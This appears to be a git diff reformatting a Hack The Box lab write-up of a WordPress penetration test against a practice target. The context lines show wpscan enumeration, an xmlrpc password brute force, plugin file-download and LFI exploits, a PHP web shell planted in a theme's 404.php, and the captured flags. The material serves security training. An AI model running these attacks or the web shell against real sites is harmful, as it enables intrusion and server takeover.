@@ -1,40 +1,35 @@
 ---
 sticker: emoji//1f43c
 ---
-
-# Skills Assessment
-
 We have reached the end of the module!
 
 Now let's put all of the new skills we have learned into practice. This final skills assessment will test each of the topics introduced in this module against a new WordPress target.
 
-***
+---
 
-### Scenario
+## Scenario
 
-You have been contracted to perform an external penetration test against the company `INLANEFREIGHT` that is hosting one of their main public-facing websites on WordPress.
+You have been contracted to perform an external penetration test against the company `INLANEFREIGHT` that is hosting one of their main public-facing websites on WordPress.
 
 Enumerate the target thoroughly using the skills learned in this module to find a variety of flags. Obtain shell access to the webserver to find the final flag.
 
 Note: You need to have a knowledge about how in Linux DNS mapping is done when the name server is missing.
 
-## Questions
+# Questions
+---
 
-***
-
-![](gitbook/cybersecurity/images/Pasted%20image%2020250220140318.png)
-
-#### Initial Enumeration
-
-***
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250220140318.png)
+### Initial Enumeration
+---
 
 Let's begin by checking the website:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250220140634.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250220140634.png)
 
 We got `Home`, `About Us`, `Services`, `Dropdown`, `Contact` and `Blog`, all seems normal, this main site is not running on WordPress so we cannot enumerate it yet, if we go to blog, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250220140811.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250220140811.png)
 
 So, we need to add `blog.inlanefreight.local` to `/etc/hosts`, let's do it:
 
@@ -44,11 +39,11 @@ echo 'IP blog.inlanefreight.local' | sudo tee -a /etc/hosts
 
 If we check this site now, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250220140954.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250220140954.png)
 
 We can check the technologies the site is using with `wappalyzer`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250220141020.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250220141020.png)
 
 There we go, it is using WordPress `5.1.6`, let's use `wpscan` for the initial enumeration:
 
@@ -305,11 +300,11 @@ Now, if we go to:
 
 We can see the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250220142528.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250220142528.png)
 
 We found the first flag:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250220142544.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250220142544.png)
 
 First flag is:
 
@@ -317,9 +312,9 @@ First flag is:
 HTB{d1sabl3_d1r3ct0ry_l1st1ng!}
 ```
 
-#### Unauthenticated File Download
+### Unauthenticated File Download
+----
 
-***
 
 Now, in order to download the file using the vulnerable plugin, we need to analyze all the plugins we're currently dealing with:
 
@@ -370,7 +365,7 @@ We have 3 plugins:
 
 We can begin by checking each one of them using the versions to check if there's any vulnerability regarding the version:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250220142950.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250220142950.png)
 
 Found the one we need, it is a `email-subscribers 4.2.2 Unauthenticated File Download` Exploit, here's the PoC:
 
@@ -413,7 +408,7 @@ Got the flag:
 HTB{unauTh_d0wn10ad!}
 ```
 
-#### Checking for LFI vulnerable plugin
+### Checking for LFI vulnerable plugin 
 
 If we now search for:
 
@@ -423,7 +418,7 @@ site-editor 1.1.1 exploit
 
 We get this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250220143320.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250220143320.png)
 
 Which means, we got our vulnerable plugin and its version:
 
@@ -431,9 +426,8 @@ Which means, we got our vulnerable plugin and its version:
 1.1.1
 ```
 
-#### Exploiting the LFI
-
-***
+### Exploiting the LFI
+---
 
 Now, let's use the lfi:
 
@@ -538,11 +532,11 @@ Answer is:
 frank.mclane
 ```
 
-#### Getting RCE
-
-***
+### Getting RCE
+---
 
 Now, our next step would be getting RCE, for this, we need some credentials, let's try brute forcing `erika`'s password:
+
 
 ```
 wpscan --password-attack xmlrpc -t 50 -U erika -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
@@ -568,11 +562,11 @@ Got our credentials:
 
 Now, let's log in:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250220144626.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250220144626.png)
 
 Now we're in the admin panel, let's change the theme to a web shell:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250220144824.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250220144824.png)
 
 Let's change the contents of `404.php` to:
 
@@ -582,7 +576,8 @@ Let's change the contents of `404.php` to:
 system($_GET['cmd']);
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250220144836.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250220144836.png)
 
 Nice, now we need to use curl to check if the webshell works:
 
@@ -620,4 +615,6 @@ Our final flag is:
 HTB{w0rdPr355_4SS3ssm3n7}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250220145253.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250220145253.png)
+
